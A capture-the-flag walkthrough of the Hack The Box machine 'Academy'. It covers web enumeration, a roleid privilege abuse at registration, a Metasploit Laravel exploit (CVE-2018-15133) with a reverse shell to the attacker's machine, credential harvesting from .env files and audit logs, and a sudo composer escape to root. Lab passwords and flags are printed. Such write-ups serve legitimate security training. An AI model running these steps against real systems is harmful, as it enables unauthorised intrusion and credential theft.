+++
title = "HTB Writeup - Academy (Easy)"
author = "CyberSpider"
description = "Writeup of Academy from Hack The Box."
tags = ['htb', 'easy', 'linux', 'CVE-2018-15133' ]
lastmod = 2023-07-18
draft = false
+++

The `Academy` machine is an easy linux box.

![Scenario 1: Across columns](/images/Academy.png#center)

## Nmap Scan

I do a `nmap scan`:

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -A -sC -sV 10.10.10.215
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:40 EDT
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 02:40 (0:00:06 remaining)
Nmap scan report for 10.10.10.215
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds
```

I edit this file `/etc/hosts` in this way:
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                       
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.10.215    academy.htb
```


## Foothold

### HTTP

In the Source Code I see this page of login:

```html
<body>
  <div class="flex-center position-ref full-height" id="canvas">
    <div class="top-right links">
      <a href="[http://academy.htb/login.php](http://academy.htb/login.php)">Login</a>
      <a href="[http://academy.htb/register.php](http://academy.htb/register.php)">Register</a>
    </div>
  <div class="content">
```


### Directory Enumeration

I do a Dirtectory enumeration with `ffuf`:

```sh
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://academy.htb/FUZZ -e .php 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://academy.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1284ms]
    * FUZZ: .htpasswd.php

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1470ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1612ms]
    * FUZZ: .htaccess.php

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 1613ms]
    * FUZZ: .htaccess

[Status: 200, Size: 2633, Words: 668, Lines: 142, Duration: 119ms]
    * FUZZ: admin.php

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 113ms]
    * FUZZ: config.php

[Status: 302, Size: 55034, Words: 4001, Lines: 1050, Duration: 119ms]
    * FUZZ: home.php

[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 113ms]
    * FUZZ: images

[Status: 200, Size: 2117, Words: 890, Lines: 77, Duration: 117ms]
    * FUZZ: index.php

[Status: 200, Size: 2627, Words: 667, Lines: 142, Duration: 125ms]
    * FUZZ: login.php

[Status: 200, Size: 3003, Words: 801, Lines: 149, Duration: 113ms]
    * FUZZ: register.php

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 116ms]
    * FUZZ: server-statuS
```

I register in this page `/register.php`:

- Request:
```http
POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=14gpqcgdsc2e9rtnpsvuouv0ba
Connection: close

uid=cyberspider&password=cyber&confirm=cyber&roleid=0
```

- Response:
```http
HTTP/1.1 200 OK
Date: Tue, 18 Jul 2023 06:57:32 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3003
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
...
```

I have see in the request a interesting parameter `roleid` I change the value from `0` to `1`:

- Request:
```http
POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=14gpqcgdsc2e9rtnpsvuouv0ba
Connection: close



uid=cyb3rspid3r&password=cyber&confirm=cyber&roleid=1
```

- Response:
```http
HTTP/1.1 302 Found
Date: Tue, 18 Jul 2023 07:03:25 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: success-page.php
Content-Length: 3003
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
...
```

I login in this page `/admin.php`, and I discover two username:

```
cry0l1t3
mrb3n
```

### CVE-2018-15133

I discover that there is a issue in this subdomain  `dev-staging-01.academy.htb`:

I edit this file `/etc/hosts` in this way:
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                       
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.10.215    academy.htb
10.10.10.215    dev-staging-01.academy.htb
```

I  see this subdomain http://dev-staging-01.academy.htb and I discover that there is a PHP Framework `Laravel`. I discover a CVE  `CVE-2018-15133`, I exploit this CVE with Metasploit:

```sh
msf6 > search CVE-2018-15133

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/http/laravel_token_unserialize_exec

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(unix/http/laravel_token_unserialize_exec) > show options

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   APP_KEY                     no        The base64 encoded APP_KEY string from the .env file
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Path to target webapp
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/http/laravel_token_unserialize_exec) > set rhosts 10.10.10.215
rhosts => 10.10.10.215
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set rport 80
rport => 80
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set lhost 10.10.14.104
lhost => 10.10.14.104
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set vhost dev-staging-01.academy.htb
vhost => dev-staging-01.academy.htb
msf6 exploit(unix/http/laravel_token_unserialize_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.104:4444 
[*] Exploit completed, but no session was created.
msf6 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf6 exploit(unix/http/laravel_token_unserialize_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.104:4444 
[*] Command shell session 5 opened (10.10.14.104:4444 -> 10.10.10.215:56944) at 2023-07-18 03:30:56 -0400

[*] Command shell session 6 opened (10.10.14.104:4444 -> 10.10.10.215:56946) at 2023-07-18 03:30:57 -0400
[*] Command shell session 7 opened (10.10.14.104:4444 -> 10.10.10.215:56948) at 2023-07-18 03:30:59 -0400
[*] Command shell session 8 opened (10.10.14.104:4444 -> 10.10.10.215:56950) at 2023-07-18 03:31:00 -0400
whoami
www-data
```

## Lateral Movement

I find the credentials for `mysql`:

```sh
python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls -all
ls -all
total 32
drwxr-xr-x  4 root root 4096 Aug 13  2020 .
drwxr-xr-x 12 root root 4096 Aug 13  2020 ..
-rw-r--r--  1 root root  593 Feb  7  2018 .htaccess
drwxr-xr-x  2 root root 4096 Aug 11  2020 css
-rw-r--r--  1 root root    0 Aug 11  2020 favicon.ico
-rw-r--r--  1 root root 1823 Aug 13  2020 index.php
drwxr-xr-x  2 root root 4096 Aug 11  2020 js
-rw-r--r--  1 root root   24 Aug 11  2020 robots.txt
-rw-r--r--  1 root root  914 Aug 11  2020 web.config
www-data@academy:/var/www/html/htb-academy-dev-01/public$ cd ..
cd ..
www-data@academy:/var/www/html/htb-academy-dev-01$ ls -all
ls -all
total 284
drwxr-xr-x 12 root root   4096 Aug 13  2020 .
drwxr-xr-x  4 root root   4096 Aug 13  2020 ..
-rw-r--r--  1 root root    702 Aug 13  2020 .env
-rw-r--r--  1 root root    651 Feb  7  2018 .env.example
-rw-r--r--  1 root root    111 Feb  7  2018 .gitattributes
-rw-r--r--  1 root root    155 Feb  7  2018 .gitignore
drwxr-xr-x  6 root root   4096 Feb  7  2018 app
-rwxr-xr-x  1 root root   1686 Feb  7  2018 artisan
drwxr-xr-x  3 root root   4096 Feb  7  2018 bootstrap
-rw-r--r--  1 root root   1513 Aug 13  2020 composer.json
-rw-r--r--  1 root root 193502 Aug 13  2020 composer.lock
drwxr-xr-x  2 root root   4096 Feb  7  2018 config
drwxr-xr-x  5 root root   4096 Feb  7  2018 database
-rw-r--r--  1 root root   1150 Feb  7  2018 package.json
-rw-r--r--  1 root root   1040 Feb  7  2018 phpunit.xml
drwxr-xr-x  4 root root   4096 Aug 13  2020 public
-rw-r--r--  1 root root   3622 Feb  7  2018 readme.md
drwxr-xr-x  5 root root   4096 Feb  7  2018 resources
drwxr-xr-x  2 root root   4096 Aug 13  2020 routes
-rw-r--r--  1 root root    563 Feb  7  2018 server.php
drwxr-xr-x  5 root root   4096 Feb  7  2018 storage
drwxr-xr-x  4 root root   4096 Feb  7  2018 tests
drwxr-xr-x 38 root root   4096 Aug 13  2020 vendor
-rw-r--r--  1 root root    549 Feb  7  2018 webpack.mix.js
www-data@academy:/var/www/html/htb-academy-dev-01$ cat .env
cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=true
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=homestead
DB_USERNAME=homestead
DB_PASSWORD=secret

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
www-data@academy:/var/www/html/htb-academy-dev-01$
www-data@academy:/var/www/html/htb-academy-dev-01$ cd ..
cd ..
www-data@academy:/var/www/html$ ls
ls
academy  htb-academy-dev-01  index.php
www-data@academy:/var/www/html$ cd academy
cd academy
www-data@academy:/var/www/html/academy$ ls
ls
app        composer.json  database      public     routes      tests
artisan    composer.lock  package.json  readme.md  server.php  vendor
bootstrap  config         phpunit.xml   resources  storage     webpack.mix.js
www-data@academy:/var/www/html/academy$ ls -all
ls -all
total 280
drwxr-xr-x 12 www-data www-data   4096 Aug 13  2020 .
drwxr-xr-x  4 root     root       4096 Aug 13  2020 ..
-rw-r--r--  1 www-data www-data    706 Aug 13  2020 .env
-rw-r--r--  1 www-data www-data    651 Feb  7  2018 .env.example
-rw-r--r--  1 www-data www-data    111 Feb  7  2018 .gitattributes
-rw-r--r--  1 www-data www-data    155 Feb  7  2018 .gitignore
drwxr-xr-x  6 www-data www-data   4096 Feb  7  2018 app
-rwxr-xr-x  1 www-data www-data   1686 Feb  7  2018 artisan
drwxr-xr-x  3 www-data www-data   4096 Feb  7  2018 bootstrap
-rw-r--r--  1 www-data www-data   1512 Feb  7  2018 composer.json
-rw-r--r--  1 www-data www-data 191621 Aug  9  2020 composer.lock
drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 config
drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 database
-rw-r--r--  1 www-data www-data   1150 Feb  7  2018 package.json
-rw-r--r--  1 www-data www-data   1040 Feb  7  2018 phpunit.xml
drwxr-xr-x  4 www-data www-data   4096 Nov  9  2020 public
-rw-r--r--  1 www-data www-data   3622 Feb  7  2018 readme.md
drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 resources
drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 routes
-rw-r--r--  1 www-data www-data    563 Feb  7  2018 server.php
drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 storage
drwxr-xr-x  4 www-data www-data   4096 Feb  7  2018 tests
drwxr-xr-x 38 www-data www-data   4096 Aug  9  2020 vendor
-rw-r--r--  1 www-data www-data    549 Feb  7  2018 webpack.mix.js
www-data@academy:/var/www/html/academy$ cat .env
cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
www-data@academy:/var/www/html/academy$ 
```

```
homestead:secret
dev:mySup3rP4s5w0rd!!
```

I have discover other `users`:

```sh
www-data@academy:/var/www/html/academy$ ls /home
21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
```

I have a problem to connect me to mysql :

```sh
www-data@academy:/var/www/html/academy$ mysql -u dev -p mySup3rP4s5w0rd!!
mysql -u dev -p mySup3rP4s5w0rd!!
mysql -u dev -p mySup3rP4s5w0rdmysql -u dev -h 127.0.0.1 -P 3306
Enter password: mySup3rP4s5w0rd!!

ERROR 1045 (28000): Access denied for user 'dev'@'localhost' (using password: YES)
```

I do any attempt and discover that the password is by `cry0l1t3`:

```sh
www-data@academy:/var/www/html/academy$ su  cry0l1t3
su  cry0l1t3
Password: mySup3rP4s5w0rd!!

$ whoami
whoami
cry0l1t3
$ 
```

I find the `user flag`:

```sh
┌──(kali㉿kali)-[~]
└─$ ssh cry0l1t3@academy.htb         
The authenticity of host 'academy.htb (10.10.10.215)' can't be established.
ED25519 key fingerprint is SHA256:hnOe1bcUjO7e/OQwjb79pf4GATiO1ov1U37KOPCkBdE.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:35: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'academy.htb' (ED25519) to the list of known hosts.
cry0l1t3@academy.htb's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 Jul 2023 07:56:43 AM UTC

  System load:             0.0
  Usage of /:              44.8% of 15.68GB
  Memory usage:            18%
  Swap usage:              0%
  Processes:               178
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.215
  IPv6 address for ens160: dead:beef::250:56ff:feb9:7ea

 * Introducing self-healing high availability clustering for MicroK8s!
   Super simple, hardened and opinionated Kubernetes for production.

     https://microk8s.io/high-availability

0 updates can be installed immediately.
0 of these updates are security updates.


Last login: Wed Aug 12 21:58:45 2020 from 10.10.14.2
$ ls
user.txt
$ cat user.txt
c5586378c310b962804e1648f494cc0f
```

I see the cry0l1t3's groups:

```sh
$ groups
cry0l1t3 adm
$ 
```

I use the `aureport` utility to query and retrieve TTY input records:

```sh
$ aureport --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
6. 08/12/2020 02:30:43 94 0 ? 1 nano <delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
7. 08/12/2020 02:32:13 95 0 ? 1 nano <down>,<up>,<up>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<backspace>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
8. 08/12/2020 02:32:55 96 0 ? 1 nano "6",<^X>,"y",<ret>
9. 08/12/2020 02:33:26 97 0 ? 1 bash "ca",<up>,<up>,<up>,<backspace>,<backspace>,"cat au",<tab>,"| grep data=",<ret>,"cat au",<tab>,"| cut -f11 -d\" \"",<ret>,<up>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<right>,<right>,"grep data= | ",<ret>,<up>," > /tmp/data.txt",<ret>,"id",<ret>,"cd /tmp",<ret>,"ls",<ret>,"nano d",<tab>,<ret>,"cat d",<tab>," | xx",<tab>,"-r -p",<ret>,"ma",<backspace>,<backspace>,<backspace>,"nano d",<tab>,<ret>,"cat dat",<tab>," | xxd -r p",<ret>,<up>,<left>,"-",<ret>,"cat /var/log/au",<tab>,"t",<tab>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,"d",<tab>,"aud",<tab>,"| grep data=",<ret>,<up>,<up>,<up>,<up>,<up>,<down>,<ret>,<up>,<up>,<up>,<ret>,<up>,<up>,<up>,<ret>,"exit",<backspace>,<backspace>,<backspace>,<backspace>,"history",<ret>,"exit",<ret>
10. 08/12/2020 02:33:26 98 0 ? 1 sh "exit",<nl>
11. 08/12/2020 02:33:30 107 0 ? 1 sh "/bin/bash -i",<nl>
12. 08/12/2020 02:33:36 108 0 ? 1 bash "istory",<ret>,"history",<ret>,"exit",<ret>
13. 08/12/2020 02:33:36 109 0 ? 1 sh "exit",<nl>
$ 
```

I discover other  credentials:

```
 mrb3n:mrb3n_Ac@d3my!
```

## Vertical Privilege Escalation

I login like  mrb3n:

```sh
┌──(kali㉿kali)-[~]
└─$ ssh mrb3n@academy.htb   
mrb3n@academy.htb's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 Jul 2023 08:08:29 AM UTC

  System load:             0.0
  Usage of /:              44.8% of 15.68GB
  Memory usage:            18%
  Swap usage:              0%
  Processes:               177
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.215
  IPv6 address for ens160: dead:beef::250:56ff:feb9:7ea

 * Introducing self-healing high availability clustering for MicroK8s!
   Super simple, hardened and opinionated Kubernetes for production.

     https://microk8s.io/high-availability

0 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Oct 21 10:55:11 2020 from 10.10.14.5
$ whoami                                          
mrb3n
```

I see all the `sudo privileges`:

```sh
$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
$ 
```

I see this page [composer | GTFOBins](https://gtfobins.github.io/gtfobins/composer/) to exploit this sudo privileges:

```sh
$ TF=$(mktemp -d)
$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
$ sudo composer --working-dir=$TF run-script x
[sudo] password for mrb3n: 
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
root
```

I find the `root flag`:
```
# cat /root/root.txt
8b675a736f5098ab7b1144f033842f36
```